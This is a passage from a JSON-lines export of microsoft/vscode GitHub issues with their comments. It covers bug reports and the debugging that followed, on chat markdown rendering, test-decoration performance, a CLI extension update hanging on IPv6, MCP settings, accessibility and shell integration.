this; it's handled in your Python code.\n</pre>\n\nThis is different than the response that was shown in the original screenshot. Are you sure that the response corresponding to this log you shared had rendering issues? And do you have a screenshot of what the chat output looked like corresponding to this log?\n\nWhen I try to parse that specific response using markdown-it 14.1.0 ([like VS Code Copilot Chat Extension does](https://github.com/microsoft/vscode-copilot-chat/blob/f94e477732da35392b640cc4fad4bdb736855ac6/src/util/common/markdown.ts#L126-L143)), I'm able to extract the following code blocks, which seems pretty normal:\n\n<pre>\n[\n  {\n    \"startMarkup\": \"```\",\n    \"code\": \"import warnings\\nwarnings.filterwarnings(\\\"ignore\\\", category=UserWarning)\",\n    \"language\": \"python\",\n    \"startLine\": 4,\n    \"endLine\": 8\n  },\n  {\n    \"startMarkup\": \"```\",\n    \"code\": \"warnings.filterwarnings(\\\"ignore\\\", category=UserWarning, module=\\\"openpyxl\\\")\",\n    \"language\": \"python\",\n    \"startLine\": 13,\n    \"endLine\": 16\n  }\n]\n</pre>\n"}, {"author": "jruales", "body": "I was able to repro using the following prompt:\n```\n@vscode please change the Code Lens Font Size from 0 to 10 in the settings, and then print out a hello world in python to confirm you followed the instructions\n```\n\nThe raw response then appears in the logs as follows:\n\n<pre>\nI'll help you change the Code Lens Font Size setting and then create a Python hello world program.\n\nFirst, let me show you how to change the Code Lens Font Size setting:\n\nUse the **editor.codeLensFontSize** setting to change the Code Lens font size from 0 to 10 pixels.\n\n```json\n[\n\t{\n\t\t\"type\": \"setting\",\n\t\t\"details\": {\n\t\t\t\"key\": \"editor.codeLensFontSize\",\n\t\t\t\"value\": \"10\"\n\t\t}\n\t}\n]\n```\n\nNow, here's a simple Python hello world program to confirm I followed your instructions:\n\n```python\nprint(\"Hello, World!\")\n```\n\nThe setting change will make Code Lens annotations display at 10 pixels font size instead of using 90% of the editor font size (which is the default when set to 0).\n</pre>\n\nThat response is rendered as follows:\n<img width=\"418\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/f5410c17-7554-4ab1-81e4-c408fa159b27\" />\n\nWhat I see missing in the UI that I see in the logs is:\n* The \"`Now, here`\" after the json code block\n* The python code block\n* The \"`The `\" after the Python block\n\nWill investigate more."}, {"author": "guilhermearaujo", "body": "@jruales indeed it wasn't the same request from the image, because I had tried with claude and then with chat gpt. I guess the image is from one, and the logs from the other."}, {"author": "jruales", "body": "@guilhermearaujo no worries, I managed to repro the issue (see my previous comment above) so I have all I need now to investigate. Thanks again for filing the issue and for the additional info!"}, {"author": "jruales", "body": "@guilhermearaujo Something else I should say is that I noticed that in your chat you tagged `@ vscode` but you asked it to do stuff related to the code on your notebook. Tagging `@ vscode` is only for asking for information about doing things in VS Code itself, like changing a VS Code setting or running a VS Code command, rather than about changing something in your file itself. So, next time, you might want to skip tagging vscode unless your question is specifically about that."}, {"author": "jruales", "body": "Fixed with https://github.com/microsoft/vscode-copilot-chat/pull/1258"}]}
{"repo": "microsoft/vscode", "issue_number": 226059, "issue_url": "https://github.com/microsoft/vscode/issues/226059", "issue_title": "InstantiationService has been disposed", "issue_author": "vscodenpa", "issue_body": "```javascript\nError: InstantiationService has been disposed\nat g.m in src/vs/platform/instantiation/common/instantiationService.ts:69:10\nat g.invokeFunction in src/vs/platform/instantiation/common/instantiationService.ts:90:8\nat H.D in src/vs/workbench/contrib/debug/browser/breakpointEditorContribution.ts:566:66\nat V.a in src/vs/workbench/contrib/debug/browser/breakpointEditorContribution.ts:232:66\nat V.h in out/vs/workbench/workbench.desktop.main.js:97:20944\nat V.g in src/vs/base/common/async.ts:1033:9\n```\n[Go to Errors Site](https://errors.code.visualstudio.com/card?ch=fee1edb8d6d72a0ddff41e5f71a671c23ed924b9&bH=bed3ce91-3c80-8072-ddf1-6de94211ecb4)", "issue_labels": ["bug", "debug", "error-telemetry", "insiders-released"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 235819, "issue_url": "https://github.com/microsoft/vscode/issues/235819", "issue_title": "Switching code editor tabs slow in workspace with many tests (~150,000)", "issue_author": "badeend", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: No\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: 1.95.3\n- OS Version: Windows 11 23H2\n\n```\nVersion: 1.95.3 (system setup)\nCommit: f1a4fb101478ce6ec82fe9627c43efbf9e98c813\nDate: 2024-11-13T14:50:04.152Z\nElectron: 32.2.1\nElectronBuildId: 10427718\nChromium: 128.0.6613.186\nNode.js: 20.18.0\nV8: 12.8.374.38-electron.0\nOS: Windows_NT x64 10.0.22631\n```\n\nSteps to Reproduce:\n\n1. Open a vscode workspace with many tests (in my case ~150,000)\n2. Wait for the language extension to discover all the tests in the project. In my case this is done by C# Dev Kit, though I doubt this matters.\n3. switching between code editor tabs takes a full second for vscode to become responsive again.\n\nI profiled the extension host while it was hanging, which show practically 0% CPU usage.\n\nNext, I profiled the main window. See [Trace-20241211T121347.json](https://github.com/user-attachments/files/18094526/Trace-20241211T121347.json)\n\nThe bulk of time is spent in `encodeURIComponentFast` which is triggered by [`testingDecorations.ts`](https://github.com/microsoft/vscode/blob/4fb4fc90310a408a4f5c6216372e634634ae8ea0/src/vs/workbench/contrib/testing/browser/testingDecorations.ts#L517-L526):\n\n![Image](https://github.com/user-attachments/assets/f507c009-c307-41c0-98e3-5aec34ba6421)\n\n\nNotes:\n- This happens on all editors in the window, even on file types not associated with the tests. E.g. switching between Markdown files is slow too. Though, switching to e.g. the \"Settings\" tabs doesn't have this problem, presumably because it isn't a code editor.\n- The delay is the same regardless of whether the open file contains any tests or not.\n- I have the Test Gutter disabled, so AFAIK, there no need to be computing this information in the first place.\n- Observation as someone not familiar with this codebase all: I notice the [code in question](https://github.com/microsoft/vscode/blob/4fb4fc90310a408a4f5c6216372e634634ae8ea0/src/vs/workbench/contrib/testing/browser/testingDecorations.ts#L517-L526) already \"spawns\" an `async` function to prevent blocking. Though, looking at the profile, all `await` points end up being scheduled on the microtask queue of the original `mousedown` event handler, so the UI rendering is blocked anyway.", "issue_labels": ["bug", "author-verification-requested", "insiders-released", "testing"], "comments": [{"author": "connor4312", "body": "I wasn't able to quite reproduce performance as bad as you had, but I made some changes which I think should resolve your issue. Please let me know."}, {"author": "vs-code-engineering[bot]", "body": "<!-- AUTHOR_VERIFICATION_REQUEST -->\nThis bug has been fixed in the latest release of [VS Code Insiders](https://code.visualstudio.com/insiders/)!\n\n@badeend, you can help us out by commenting `/verified` if things are now working as expected.\n\nIf things still don't seem right, please ensure you're on version ce50bd4876af457f64d83cfd956bc916535285f4 of Insiders (today's or later - you can use `Help: About` in the command palette to check), and leave a comment letting us know what isn't working as expected.\n\nHappy Coding!"}, {"author": "badeend", "body": "First of all, thanks for the quick response! Unfortunately, the problem still appears. I've taken a new profiler snapshot: [Trace-20241216T201448.json](https://github.com/user-attachments/files/18156060/Trace-20241216T201448.json)\n\nMost time is still spent in `encodeURIComponentFast`, like above.\n\nI'm on:\n```\nVersion: 1.97.0-insider (user setup)\nCommit: ce50bd4876af457f64d83cfd956bc916535285f4\nDate: 2024-12-16T05:04:30.005Z\nElectron: 32.2.6\nElectronBuildId: 10629634\nChromium: 128.0.6613.186\nNode.js: 20.18.1\nV8: 12.8.374.38-electron.0\nOS: Windows_NT x64 10.0.22631\n```\n\n"}]}
{"repo": "microsoft/vscode", "issue_number": 260281, "issue_url": "https://github.com/microsoft/vscode/issues/260281", "issue_title": "Clicking on a change pill should preserve focus in chat", "issue_author": "bpasero", "issue_body": "Steps to Reproduce:\n\n1.  have chat output with change pills\n2. click on a pill\n\n=> notice how focus immediately moves into the editor\n\nRather it should focus the pill but keep focus.\n\n<img width=\"327\" height=\"350\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/49595c00-a0ad-44f8-a254-a5eb5e815f3a\" />\n\nIn addition:\n* double click should move focus\n* keyboard enter/space should move focus\n* Alt+click should open to the side\n* mouse middle click should pin", "issue_labels": ["bug", "insiders-released", "papercut :drop_of_blood:", "workbench-copilot"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 264136, "issue_url": "https://github.com/microsoft/vscode/issues/264136", "issue_title": "CLI hangs indefinitely when updating extensions on IPv6 Network", "issue_author": "SteveCoding125", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: No\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: 1.103.2\n- OS Version: Windows 10 22H2\n\nSteps to Reproduce:\n\n1. have a working IPv6 connection\n2. run `code --update-extensions` with at least one extension out of date\n\nFrom what I can tell, on the CDN side this is the same issue as in winget (https://github.com/microsoft/winget-cli/issues/5693). Both `cdn.winget.microsoft.com` and `main.vscode-cdn.net` use the same CDN (`star-azurefd-prod.trafficmanager.net`).\n\nIn the VS Code UI, there seems to be a timeout and automatic fallback to IPv4, but the same is not happening with the CLI. It just hangs when trying to get `https://main.vscode-cdn.net/extensions/marketplace.json`.\n\nOn the CDN side, an incident should already be opened. But it would probably be good to have the same fallback logic in the CLI as exists in the UI.", "issue_labels": ["bug", "workbench-cli", "insiders-released", "network"], "comments": [{"author": "Sanel0101", "body": "so i search a parner\r\n\r\nGesendet von Outlook f\u00fcr iOS<https://aka.ms/o0ukef>\r\n________________________________\r\nVon: SteveCoding125 ***@***.***>\r\nGesendet: Saturday, August 30, 2025 9:35:13 AM\r\nAn: microsoft/vscode ***@***.***>\r\nCc: Subscribed ***@***.***>\r\nBetreff: [microsoft/vscode] CLI hangs indefinitely when updating extensions on IPv6 Network (Issue #264136)\r\n\r\n[https://avatars.githubusercontent.com/u/43781517?s=20&v=4]SteveCoding125 created an issue (microsoft/vscode#264136)<https://github.com/microsoft/vscode/issues/264136>\r\n\r\nDoes this issue occur when all extensions are disabled?: No\r\n\r\n  *   VS Code Version: 1.103.2\r\n  *   OS Version: Windows 10 22H2\r\n\r\nSteps to Reproduce:\r\n\r\n  1.  have a working IPv6 connection\r\n  2.  run code --update-extensions with at least one extension out of date\r\n\r\nFrom what I can tell, on the CDN side this is the same issue as in winget (microsoft/winget-cli#5693<https://github.com/microsoft/winget-cli/issues/5693>). Both cdn.winget.microsoft.com and main.vscode-cdn.net use the same CDN (star-azurefd-prod.trafficmanager.net).\r\n\r\nIn the VS Code UI, there seems to be a timeout and automatic fallback to IPv4, but the same is not happening with the CLI. It just hangs when trying to get https://main.vscode-cdn.net/extensions/marketplace.json.\r\n\r\nOn the CDN side, an incident should already be opened. But it would probably be good to have the same fallback logic in the CLI as exists in the UI.\r\n\r\n\u2014\r\nReply to this email directly, view it on GitHub<https://github.com/microsoft/vscode/issues/264136>, or unsubscribe<https://github.com/notifications/unsubscribe-auth/BJWPSBO74DPG2PGULDLGOAL3QFH3DAVCNFSM6AAAAACFGKU6L6VHI2DSMVQWIX3LMV43ASLTON2WKOZTGM3DQOBVGMZDEOA>.\r\nYou are receiving this because you are subscribed to this thread.Message ID: ***@***.***>\r\n"}, {"author": "sandy081", "body": "Can you please run with `--verbose` option and share the logs"}, {"author": "SteveCoding125", "body": "[cli.log](https://github.com/user-attachments/files/22214617/cli.log)\n\nThis is what I get with IPv6 enabled and at least one update available. After this, the CLI just hangs, until I terminate it manually.\nIf no updates are available or IPv6 is disabled, the CLI behaves as expected.\n\nWhen I run updates through the UI with IPv6 enabled, everything works as expected."}, {"author": "sandy081", "body": "I would like to compare the logs when running through the UI. \n\n- Start VS Code in verbose mode from CLI `code --verbose`\n- Reproduce the issue\n- Share the log - F1 > Open View... > Shared"}, {"author": "SteveCoding125", "body": "[Shared.log](https://github.com/user-attachments/files/22274792/Shared.log)\n\nThis is with IPv6 enabled, updating the same extension, and the update goes through."}, {"author": "sandy081", "body": "I do not see network requests in this log. Have you followed my steps to get the log?"}, {"author": "SteveCoding125", "body": "I think so:\n- I opened vscode using the `code --verbose` command while having IPv6 enabled and one extension to update\n- I clicked on the update button on the integration\n- after the update was completed, I pressed `F1` -> `View: Open View` -> `Shared` -> three dots in the top right of the Output panel -> `Save Output As...`\nThat produced the `Shared.log`.\n\nI have now tried removing the `AppData\\Roaming\\Code\\CachedExtensionVSIXs` folder to force vscode to download these files.\n\n[Shared.log](https://github.com/user-attachments/files/22294261/Shared.log)"}, {"author": "sandy081", "body": "> F1 -> View: Open View -> Shared\n\nCan you see network requests in that log?"}, {"author": "SteveCoding125", "body": "do you mean this?\n\n```\n2025-09-12 11:06:27.653 [trace] [Network] #1: https://vscode-sync.trafficmanager.net/v1/manifest - begin GET\n```"}, {"author": "sandy081", "body": "Ok, I see now. It looks like you have issues accessing following url from CLI - `https://main.vscode-cdn.net/extensions/marketplace.json` - Can you please try accessing it and let me know what you get?"}, {"author": "SteveCoding125", "body": "With IPv6 enable, it get `main.vscode-cdn.net took too long to respond.`\nWith  IPv4 the JSON loads correctly."}, {"author": "sandy081", "body": "> With IPv6 enable, it get main.vscode-cdn.net took too long to respond.\n\nI am not a network expert. Looks like it is related to your device configuration issue. I would suggest to check in internet for the answer."}, {"author": "SteveCoding125", "body": "The same issue happens for other people on winget since it and vscode share a CDN provider (`star-azurefd-prod.trafficmanager.net`).\nIn the winget thread (https://github.com/microsoft/winget-cli/issues/5693) you can see a very detailed report for this issue.\n[In this comment](https://github.com/microsoft/winget-cli/issues/5693#issuecomment-3268066065) you can see that the CDN answers with malformed packets.\n\nThat means the issue is not just my network configuration.\n\nI was hoping, we can add something to the CLI to be able to update the extensions when something like this happens. The UI already has something in place, since updates work perfectly fine with IPv6 enabled."}, {"author": "sandy081", "body": "> The UI already has something in place, since updates work perfectly fine with IPv6 enabled.\n\nActually there is a bug in UI because of which it is working. Fixing this bug makes it consistent with CLI - https://github.com/microsoft/vscode/issues/266346\n\nBut we have a timeout of 10s for network requests. I am not sure why this is not happening on CLI. \n\n@deepak1556 Can you please check and let me know why timeout is not working in CLI?"}, {"author": "deepak1556", "body": "@SteveCoding125 can you confirm the following,\n\n1) The output of `curl -6 https://main.vscode-cdn.net/extensions/marketplace.json -v` and `curl https://main.vscode-cdn.net/extensions/marketplace.json -v`\n2) Runtime network log for ipv4 and ipv6 using the following steps,\n   a) Start with `code --update-extensions --log-net-log=<path-to>/netlog.json`, you should replace `<path-to>` with some absolute directory path\n   b) Attach the generated network log files to this issue or you can send them to Deepak.Mohan@microsoft.com"}, {"author": "SteveCoding125", "body": "I have run `curl -6 ...`, `curl -4 ...` and `curl ...`:\n- [curl-6.log](https://github.com/user-attachments/files/22309814/curl-6.log)\n- [curl-4.log](https://github.com/user-attachments/files/22309816/curl-4.log)\n- [curl-default.log](https://github.com/user-attachments/files/22309818/curl-default.log)\n\nWhen I try running `code --update-extensions --log-net-log=<path-to>/netlog.json` I get no `netlog.json` for both IPv4 and IPv6. Do I need a specific version of vscode for this option?\n\nWith verbose output the CLI gets stuck at\n```\nTRACE #120: https://main.vscode-cdn.net/extensions/marketplace.json - begin GET Im { b: {}, a: [Object: null prototype] {} }\n```"}, {"author": "deepak1556", "body": "@sandy081 do we use Node.js network stack for the `--update-extensions` requests from cli or does it use the same chromium network stack as the extensions UI  ? "}, {"author": "sandy081", "body": "its CLI so I suppose it uses Node.js network stack"}, {"author": "deepak1556", "body": "Ah that would explain the difference in results\n\n@SteveCoding125 can you try the following with node.js >= v22 and share the output\n\n```\nNODE_DEBUG=\"net\" node /Applications/Visual\\ Studio\\ Code.app/Contents/Resources/app/out/cli.js --update-extensions\n```"}, {"author": "SteveCoding125", "body": "I have run this with node.js v24.9.0, and I got the following output. The last part keeps repeating until I stop the process.\n\n[output.txt](https://github.com/user-attachments/files/22685976/output.txt)"}, {"author": "deepak1556", "body": "Thanks for the log, couple of things\n\n1) the current timeout to autoselect between families is 250ms\n2) the default result order is ipv6 and then ipv4 \n\nSo I believe either of these should address the issue, can you confirm the request completes\n\n```\nNODE_DEBUG=\"net\" node --network-family-autoselection-attempt-timeout=10 /Applications/Visual\\ Studio\\ Code.app/Contents/Resources/app/out/cli.js --update-extensions\n```\n\nor\n\n```\nNODE_DEBUG=\"net\" node --dns-result-order=ipv4first /Applications/Visual\\ Studio\\ Code.app/Contents/Resources/app/out/cli.js --update-extensions\n```"}, {"author": "SteveCoding125", "body": "This was a bit weird:\n\n`--dns-result-order=ipv4first` worked immediately with ipv6 is enabled: [output-fixed.txt](https://github.com/user-attachments/files/22687646/output-fixed.txt)\n\n `--network-family-autoselection-attempt-timeout=10` produced the same output as no flags. I wanted to take a look at the timing of the log output because I noticed, that I wouldn't get any more logs after about 30s (even when running for 5+ minutes). After running with this flag 5-10 times it suddenly worked with ipv6 enabled.\nI have tried running this a few more times and found this:\nNormally I get this output\n```\nNET 36764: connect/multiple: attempting to connect to 2620:1ec:29:1::67:443 (addressType: 6)\nNET 36764: connect/multiple: setting the attempt timeout to 10 ms\nNET 36764: connect/multiple: connection attempt to 2620:1ec:29:1::67:443 completed with status 0\nNET 36764: afterConnect\nNET 36764: _read - n 16384 isConnecting? false hasHandle? true\nNET 36764: Socket._handle.readStart\nNET 36764: _onTimeout\nNET 36764: destroy\nNET 36764: close\nNET 36764: close handle\nNET 36764: _onTimeout\n...\n```\nBut *sometimes* when I run with this flag I get the following:\n```\nNET 31152: connect/multiple: attempting to connect to 2620:1ec:bdf::44:443 (addressType: 6)\nNET 31152: connect/multiple: setting the attempt timeout to 10 ms\nNET 31152: connect/multiple: connection to 2620:1ec:bdf::44:443 timed out\nNET 31152: connect/multiple: attempting to connect to 13.107.246.44:443 (addressType: 4)\nNET 31152: connect/multiple: setting the attempt timeout to 10 ms\nNET 31152: connect/multiple: connection attempt to 13.107.246.44:443 completed with status 0\nNET 31152: afterConnect\nNET 31152: _read - n 16384 isConnecting? false hasHandle? true\n...\n```\nWith this output, the updates works.\n\nThis looks like, there is a check to see whether IPv6 works, this comes back as 'all good', but when trying to download the necessary files, the connection times out and won't switch to IPv4. But sometimes this first check fails, a fallback to IPv4 is done and everything works."}, {"author": "asnas-achu", "body": "[]()"}, {"author": "deepak1556", "body": "> This looks like, there is a check to see whether IPv6 works, this comes back as 'all good', but when trying to download the necessary files, the connection times out and won't switch to IPv4.\n\nAh yes, the fallback only happens when the initial connection attempt fails. If that succeeds then a timeout down in the socket will not retry.\n\nRunning with `--dns-result-order=ipv4first` for the cli should be a good first change for this issue, we already do that for Node.js network usages in the extension host."}]}
{"repo": "microsoft/vscode", "issue_number": 264853, "issue_url": "https://github.com/microsoft/vscode/issues/264853", "issue_title": "MCP Server Sampling Configuration Overwrites Previous Entries Instead of Adding New Ones", "issue_author": "iwangbowen", "issue_body": "\nType: <b>Bug</b>\n\nWhen configuring model access for MCP servers in VS Code Extensions > MCP Servers (right-click > Config Model Access > check models > save), the first server's settings are added to chat.mcp.serverSampling in settings.json. However, configuring a second server overwrites the previous entry instead of adding a new one.\n\nExpected: Add new entries for each server.\nActual: Replaces existing entry.\n\nVS Code version: Code - Insiders 1.104.0-insider (a2b1ec5f3ba438c7e65b47303a4994543bab72c2, 2025-09-02T15:56:07.546Z)\nOS version: Windows_NT x64 10.0.26100\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|13th Gen Intel(R) Core(TM) i5-1340P (16 x 2189)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|undefined|\n|Memory (System)|63.64GB (31.17GB free)|\n|Process Argv|--crash-reporter-id 3df60e69-6e36-46e5-9b3d-020ce9a3ab01|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (128)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\ncodesnap|adp|1.3.4\nmarkdown-mermaid|bie|1.28.0\nvs-code-bpmn-io|bpm|0.22.2\nvscode-tailwindcss|bra|0.14.26\nruff|cha|2025.24.0\nnpm-intellisense|chr|1.4.5\npath-intellisense|chr|2.10.0\nvscode-markdownlint|Dav|0.60.0\nvscode-eslint|dba|3.0.19\ndbcode|dbc|1.16.6\nFreeMarker|dco|0.0.9\ndingtalk-toolkit|Din|0.2.11\ndocker|doc|0.16.0\ngithistory|don|0.6.20\ngitlens|eam|2025.8.2705\nEditorConfig|Edi|0.17.4\nmagick-image-reader|ely|0.5.0\nprettier-vscode|esb|11.0.0\ndependi|fil|0.7.15\nshell-format|fox|7.2.8\ncodespaces|Git|1.17.4\ncopilot|Git|1.366.1775\ncopilot-chat|Git|0.31.2025090201\nremotehub|Git|0.65.2025081801\nvscode-github-actions|git|0.27.2\nvscode-pull-request-github|Git|0.117.2025090204\ngc-excelviewer|Gra|4.2.64\noutput-colorizer|IBM|0.1.2\nicon-fonts|idl|2.5.4\nlatex-workshop|Jam|10.10.2\nsvg|joc|1.5.4\nvscode-gutter-preview|kis|0.32.2\nvscode-leetcode|Lee|0.18.4\ni18n-ally|lok|2.13.1\nrainbow-csv|mec|3.21.0\ndotenv|mik|1.0.1\necdc|mit|1.8.0\nvscode-filesize|mkx|3.2.2\nvscode-containers|ms-|2.1.0\nvscode-dotnet-runtime|ms-|2.3.7\nplaywright|ms-|1.1.15\nblack-formatter|ms-|2025.3.11831009\ndebugpy|ms-|2025.11.2025072901\nmypy-type-checker|ms-|2025.3.12271015\npylint|ms-|2025.3.12271016\npython|ms-|2025.13.2025090201\nvscode-pylance|ms-|2025.7.102\nvscode-python-envs|ms-|1.4.0\npython-ds-extension-pack|ms-|0.0.1\nremote-containers|ms-|0.426.0\nremote-ssh|ms-|0.121.2025081515\nremote-ssh-edit|ms-|0.87.0\nremote-wsl|ms-|0.104.1\nremote-wsl-recommender|ms-|0.0.20\nvscode-remote-extensionpack|ms-|0.26.0\nazure-repos|ms-|0.41.2025081801\ncmake-tools|ms-|1.22.8\ncpptools|ms-|1.27.2\ncpptools-extension-pack|ms-|1.3.1\ndebug-value-editor|ms-|0.2.2\nextension-test-runner|ms-|0.0.12\nhexeditor|ms-|1.11.1\nlive-server|ms-|0.5.2025082601\npowershell|ms-|2025.3.1\nremote-explorer|ms-|0.6.2025081809\nremote-repositories|ms-|0.43.2025081801\nremote-server|ms-|1.6.2025081809\nts-file-path-support|ms-|1.0.0\nvscode-github-issue-notebooks|ms-|0.0.133\nvscode-serial-monitor|ms-|0.13.250903001\nvscode-speech|ms-|0.16.0\nvscode-speech-language-pack-zh-cn|ms-|0.5.1\nvscode-typescript-next|ms-|6.0.20250902\nvscode-websearchforcopilot|ms-|0.1.2025090201\nweb-editors|ms-|0.3.0\nvsliveshare|ms-|1.0.5959\nwindows-ai-studio|ms-|0.18.3\ntypescript-explorer|mxs|0.4.2\nneo4j-for-vscode|neo|1.13.0\nindent-rainbow|ode|8.3.1\nvscode-versionlens|pfl|1.22.2\nmaterial-icon-theme|PKi|5.26.0\npostman-for-vscode|Pos|1.16.1\nvscode-css-peek|pra|4.4.3\ninline-html|pus|0.3.10\ngeo-data-viewer|Ran|2.6.0\ntmlanguage-syntax-highlighter|Red|2.7.8\njava|red|1.44.0\nvscode-commons|red|0.0.6\nvscode-community-server-connector|red|0.26.19\nvscode-rsp-ui|red|0.24.11\nvscode-xml|red|0.29.2025081108\nvscode-yaml|red|1.18.0\nredis-for-vscode|Red|1.4.0\nomegasheets-vscode|rep|0.2.0\nLiveServer|rit|5.7.9\nroo-cline|Roo|3.26.4\nclaude-dev|sao|3.27.0\ndocxreader|Sha|1.2.2\nsonarlint-vscode|Son|4.30.0\ncode-spell-checker|str|4.2.6\ncode-spell-checker-cspell-bundled-dictionaries|str|2.0.8\nvscode-stylelint|sty|1.5.3\neven-better-toml|tam|0.21.2\nshellcheck|tim|0.38.3\nvscode-decompiler|tin|0.1.0\nnative-preview|Typ|0.20250902.1\nluna-paint|Tyr|0.17.0\nerrorlens|use|3.26.0\nintellicode-api-usage-examples|Vis|0.2.9\nvscodeintellicode|Vis|1.3.2\nvscodeintellicode-completions|Vis|2.0.1\nexplorer|vit|1.28.2\nvscode-css-compatibility|viv|1.0.2\nvscode-boot-dev-pack|vmw|0.2.2\nvscode-java-debug|vsc|0.58.2025082105\nvscode-java-dependency|vsc|0.24.1\nvscode-java-pack|vsc|0.29.2025081500\nvscode-java-test|vsc|0.43.2025040304\nvscode-maven|vsc|0.44.2024072906\nvscode-spring-initializr|vsc|0.11.2025062607\nvolar|Vue|3.0.6\nvscode-wakatime|Wak|25.3.2\nquokka-vscode|Wal|1.0.737\nvscode-import-cost|wix|3.3.0\npretty-ts-errors|Yoa|0.6.1\nmarkdown-all-in-one|yzh|3.6.3\nmaterial-theme|zhu|3.19.0\n\n(2 theme extensions excluded)\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368:30146709\npythonvspyt551:31249597\nnativeloc1:31118317\ndwcopilot:31158714\ndwoutputs:31242946\ncopilot_t_ci:31333650\ng012b348:31231168\npythoneinst12:31251391\n6gi0g917:31259950\n996jf627:31264550\npythonrdcb7:31268811\nusemplatestapi:31297334\n747dc170:31275146\n6518g693:31302842\n0g1h6703:31329154\nagentisdefault:31374427\n6abeh943:31336334\nenvsactivate1:31349248\n0927b901:31340060\neditstats-enabled:31346256\ngendocstringt:31371829\ncloudbuttont:31366566\naihoversummaries_f:31371859\ntodos-1:31366868\nv2-prompt:31370220\nsearch_len2:31376507\nmultireplacestring:31375832\nnb255704_tf:31377673\n3efgi100_wstrepl:31374188\nnes-auto-20:31375598\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "insiders-released", "chat-mcp"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 266256, "issue_url": "https://github.com/microsoft/vscode/issues/266256", "issue_title": "Tool invocation for extension tools are not announced to screen reader users", "issue_author": "meganrogge", "issue_body": "We only know about them in the rendering code, so would need a way to set / check for the ID to ensure it's only announced on initial render\n\ncc @roblourens ", "issue_labels": ["bug", "accessibility", "insiders-released"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 266489, "issue_url": "https://github.com/microsoft/vscode/issues/266489", "issue_title": "Shell integration fails with set -u", "issue_author": "demccormack", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: Yes\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: 1.104.0\n- OS Version: Darwin x64 24.6.0\n\n### Steps to Reproduce:\n\n1. Put `set -u` in your `~/.bashrc` or `~/.zshrc`.\n2. Start a Bash or Zsh terminal in VS Code.\n3. Shell integration fails with the message\n```\nXXX-code-zsh/.zshrc:73: VSCODE_PYTHON_AUTOACTIVATE_GUARD: parameter not set\n```\n\n### Workaround\nIt can be worked around by exporting the missing env vars, like in [this PR](https://github.com/demccormack/dotfiles-public/pull/2).\n\n### Related issues\nThe same bug (for different env vars) was previously fixed in #185324 - these must've been added since then.\n", "issue_labels": ["bug", "insiders-released", "terminal-shell-integration"], "comments": []}
